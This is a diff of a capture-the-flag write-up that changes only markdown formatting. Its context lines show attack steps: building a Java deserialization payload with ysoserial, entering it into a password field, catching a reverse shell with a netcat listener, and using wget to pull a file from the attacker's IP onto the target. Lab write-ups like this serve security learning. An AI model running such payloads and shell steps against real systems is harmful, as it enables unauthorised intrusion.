@@ -255,7 +255,7 @@ public static String changePW(ArrayList<String> args, User user) {
   
   
   Create the payload
-  --------------------
+  ------------------
   
   Prepare payloads using [yoserial](https://github.com/frohoff/ysoserial)  Tool
   
@@ -273,8 +273,10 @@ Let us assume that netcat is installed on the system. With this we can generate 
   Now we just have to enter the `base64 payload` into the password field and start our listener om any port
   
   Getting User.flag
-  ==================
-  
+ ====================
+ 
+ 
+ 
   ```bash
   root@kali:~# nc -lvnp 443
 Ncat: Version 7.80 ( https://nmap.org/ncat )
@@ -468,7 +470,7 @@ The key's randomart image is:
 +----[SHA256]-----+
 
 ```
-**Uploading the file to Server
+**Uploading the file to Server**
 
 ```bash
 2f265ce12800:/opt/fatty/tar$ wget 10.10.14.8/logs.tar
